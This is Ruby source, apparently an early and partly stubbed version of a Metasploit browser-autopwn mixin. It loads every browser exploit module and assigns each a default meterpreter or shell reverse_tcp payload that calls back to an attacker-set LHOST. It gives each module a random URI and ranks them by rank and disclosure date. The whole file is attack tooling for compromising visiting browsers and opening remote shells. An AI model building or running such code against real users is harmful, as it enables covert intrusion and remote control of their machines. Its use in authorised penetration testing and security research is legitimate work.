###
#
# The Msf::Exploit::Remote::BrowserAutopwnv2 mixin is a replacement for the current BrowserAutoPwn
#
###

require 'Date'

module Msf
  module Exploit::Remote::BrowserAutopwnv2

    # Exception specific for Msf::Exploit::Remote::BrowserAutopwnv2
    class BAPv2Exception < RuntimeError; end

    include Msf::Exploit::Remote::BrowserExploitServer

    # @return [Array] A list of initialized BAP exploits
    attr_reader :bap_exploits


    # The default platform-specific payloads and preferred LPORTS.
    # The hash key is the name of the platform that matches what's on the module.
    DEFAULT_PAYLOADS = {
      'win'     => { 'payload' => 'windows/meterpreter/reverse_tcp', 'lport' => 4444 },
      'linux'   => { 'payload' => 'linux/meterpreter/reverse_tcp',   'lport' => 4445 },
      'osx'     => { 'payload' => 'osx/meterpreter/reverse_tcp',     'lport' => 4446 },
      'java'    => { 'payload' => 'java/meterpreter/reverse_tcp',    'lport' => 4447 },
      'android' => { 'payload' => 'android/meterpreter/reverse_tcp', 'lport' => 4448 },
      'firefox' => { 'payload' => 'firefox/shell_reverse_tcp',       'lport' => 4449 },
      'generic' => { 'payload' => 'generic/shell_reverse_tcp',       'lport' => 4450 }
    }


    # Returns all the found exploit modules that support BrowserExploitServer by going through all
    # the exploits from the framework object.
    #
    # @return [Array] A collection of BES modules in this format: [module_fullname, Class].
    def init_exploit_paths
      framework.exploits.find_all do |m|
        next if !m.first.include?('browser') || m.last == "__SYMBOLIC__" || m.last.fullname == self.fullname
        m.last.ancestors.include? Msf::Exploit::Remote::BrowserExploitServer
      end
    end


    # Initializes the @bap_exploits instance variable with all the found BAP exploits.
    #
    # @see #bap_exploits The read-only attribute.
    # @return [void]
    def init_exploits
      @bap_exploits = [] # Initialized BES modules are held here

      init_exploit_paths.each do |m|
        module_name = m.first
        xploit = framework.exploits.create(module_name)
        unless xploit
          print_status("Failed to load: #{name}")
          next
        end
        set_exploit_options(xploit)
        @bap_exploits << xploit
      end
    end


    # Prints BAP module names
    #
    # @return [void]
    def list_bap_names
      bap_exploits.each do |m|
        print_status(m.fullname)
      end
    end


    # Modifies an exploit's default datastore options.
    #
    # @return [void]
    def set_exploit_options(xploit)
      p = pick_default_payload(xploit)
      xploit.datastore['DisablePayloadHandler'] = true            # BAP should handle the handlers
      xploit.datastore['PAYLOAD'] = p['payload']                  # We'll need this information later for multi handler
      xploit.datastore['LPORT']   = p['lport']                    # We'll need this information later for multi handler
      xploit.datastore['SSL'] = datastore['SSL']                  # Use SSL or not
      xploit.datastore['SSLVersion'] = datastore['SSLVersion']    # SSL Version
      xploit.datastore['LHOST'] = datastore['LHOST'] || '0.0.0.0' # Attacker's IP
      xploit.datastore['URI'] = "/#{assign_module_resource}"
    end


    # Checks if a resource is already taken or not.
    #
    # @return [TrueClass] Resource is taken.
    # @return [FalseClass] Resource is not taken.
    def is_resource_taken?(resource)
      taken = false

      bap_exploits.each do |m|
        return true if m.datastore['URI'] == resource
      end

      taken
    end


    # Returns a unique resource path.
    #
    # @return [String] A unique resource path.
    def assign_module_resource
      resource = ''
      while
        resource = Rex::Text.rand_text_alpha(rand(10) + 4)
        break unless is_resource_taken?(resource)
      end

      resource
    end


    # Returns a preferred default payload. The load order is based on this preference:
    # if there is a browser-specific payload (such as firefox), then we'll use that as default.
    # And then we fall back to the module's platform. If there's nothing we can choose,
    # then we'll just use the generic reverse shell.
    #
    # @see DEFAULT_PAYLOADS
    # @param [Class] The initialized exploit object.
    # @return [Hash] The default payload information from DEFAULT_PAYLOADS.
    def pick_default_payload(m)
      module_platforms = m.platform.platforms
      preferred_payload = DEFAULT_PAYLOADS['generic']

      # Specific load order
      if module_platforms.include?('firefox')
        preferred_payload = DEFAULT_PAYLOADS['firefox']
      elsif module_platforms.include?('java')
        preferred_payload = DEFAULT_PAYLOADS['java']
      elsif module_platforms.include?('android')
        preferred_payload = DEFAULT_PAYLOADS['android']
      elsif module_platforms.include?('win')
        preferred_payload = DEFAULT_PAYLOADS['win']
      elsif module_platforms.include?('linux')
        preferred_payload = DEFAULT_PAYLOADS['linux']
      elsif module_platforms.include?('osx')
        preferred_payload = DEFAULT_PAYLOADS['osx']
      end

      preferred_payload
    end


    # Modifies @bap_exploits by sorting. The newest and with the highest ranking goes on top.
    #
    # @see #bap_exploits The read-only attribute.
    # @see #sort_date_in_group The method for sorting by disclosure date
    # @see #sort_group_by_rank The method for sorting by rank
    # @see #sort_bap_modules The method for breaking the module list into groups
    # @see #finalize_sorted_modules The method for finalizing bap_exploits
    # @return [void]
    def sort_bap_exploits
      bap_groups = group_bap_modules
      bap_groups = sort_date_in_group(bap_groups)
      bap_groups = sort_group_by_rank(bap_groups)
      finalize_sorted_modules(bap_groups)
    end


    # Sorts a grouped module list by disclosure date.
    #
    # @param [Hash] A grouped module list.
    # @return [Hash] A hash with each module list sorted by disclosure date.
    def sort_date_in_group(bap_groups)
      bap_groups.each_pair do |ranking, module_list|
        bap_groups[ranking] = module_list.sort_by {|m| Date.parse(m.disclosure_date.to_s)}.reverse
      end
    end


    # Sorts a module list by ranking.
    #
    # @param [Hash] A grouped module list.
    # @return [Hash] A hash grouped by ranking.
    def sort_group_by_rank(bap_groups)
      Hash[bap_groups.sort_by {|k,v| k}.reverse]
    end


    # Breaks @bap_exploits into groups for sorting purposes.
    #
    # @return [Hash] A module list grouped by rank.
    def group_bap_modules
      bap_groups = {}
      RankingName.each_pair do |ranking, value|
        bap_groups[ranking] = []
        bap_exploits.each do |m|
          next if m.rank != ranking
          bap_groups[ranking] << m
        end
      end
      bap_groups
    end


    # Modifies @bap_exploit by replacing it with the rearranged module list.
    #
    # @see #bap_exploits The read-only attribute.
    # @param [Hash] A grouped module list.
    # @return [void]
    def finalize_sorted_modules(bap_groups)
      @bap_exploits = []
      bap_groups.each_pair do |ranking, module_list|
        module_list.each do |m|
          @bap_exploits << m
        end
      end
    end


    # Returns a list of suitable exploits for the current target.
    #
    # @param [Hash] Target's information such as the OS, browser, 3rd-party plugins, etc.
    # @return [Array] A list of suitable exploits to use against the target.
    def find_suitable_exploits(target_info)
      $stderr.puts target_info.inspect
    end


    # Sets up BAPv2. This is like our main function.
    #
    # @see #init_exploits
    # @see #sort_bap_exploits
    # @return [void]
    def setup
      super
      print_status("Searching BES exploits, please wait...")
      init_exploits
      sort_bap_exploits
      $stderr.puts
      $stderr.puts list_bap_names
      print_status("#{@bap_exploits.length} BES exploits found.")
    end

  end
end
